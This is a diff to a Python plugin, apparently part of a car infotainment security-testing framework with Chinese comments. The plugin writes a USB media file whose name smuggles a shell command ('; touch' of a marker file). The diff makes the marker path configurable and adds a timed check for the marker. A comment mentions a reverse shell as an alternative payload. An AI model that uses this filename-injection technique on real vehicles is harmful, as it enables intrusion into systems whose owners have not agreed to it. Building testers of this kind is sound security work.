@@ -19,11 +19,13 @@ class FilenameCmdInjectPlugin(IVIVulnerabilityPlugin):
     meta_severity = "Medium"
     meta_protocol = "unknown"
     meta_target_os = ["all"]
-    meta_required_params = ["usb_mount_point"]
+    meta_required_params = []
     is_disruptive = False
     meta_destructive_level = "Safe"
 
     def check_prerequisites(self):
+        self.marker_path = self.params.get("marker_path", "/tmp/pwned_usb")
+        self.observe_seconds = float(self.params.get("observe_seconds", 5))
         return True
 
     def exploit(self):
@@ -34,7 +36,8 @@ class FilenameCmdInjectPlugin(IVIVulnerabilityPlugin):
         # 如果文件名包含单引号闭合和反引号/分号，就会造成代码执行
         
         # payload 将在车载系统上执行：创建 /tmp/pwned_by_usb 标志文件或反弹 Shell
-        malicious_filename = "track01'; touch \\x2ftmp\\x2fpwned_usb; echo 'pwned.mp3"
+        shell_marker = self.marker_path.replace("/", "\\x2f")
+        malicious_filename = f"track01'; touch {shell_marker}; echo 'pwned.mp3"
         safe_display_name = "track01_inject.mp3"
         
         payload_dir = "/tmp/ivi_usb_payloads"
@@ -57,12 +60,19 @@ class FilenameCmdInjectPlugin(IVIVulnerabilityPlugin):
             self.logger.warning(f"[SUCCESS] 恶意媒体文件已在本地生成！")
             self.logger.warning(f"  绝对路径: {full_path}")
             self.logger.warning("[!] 请将此文件拷贝到物理U盘根目录，并插入到目标车机。")
-            self.logger.warning("[!] 如果车机会自动索引音乐，此文件名将在解析时触发 Shell 命令：touch /tmp/pwned_usb")
+            self.logger.warning(f"[!] 如果车机会自动索引音乐，此文件名将在解析时触发 Shell 命令：touch {self.marker_path}")
+            time.sleep(self.observe_seconds)
+            if os.path.exists(self.marker_path):
+                return {
+                    "status": "success",
+                    "vulnerable": True,
+                    "details": f"Observed injected marker file at {self.marker_path} after malicious filename processing."
+                }
             
             return {
                 "status": "success",
                 "vulnerable": False,
-                "details": f"已生成恶意文件名样本 {full_path}，需在目标车机实际索引后再确认是否可命令注入。"
+                "details": f"已生成恶意文件名样本 {full_path}，但未在 {self.marker_path} 观察到自动化命令执行证据。"
             }
             
         except Exception as e:
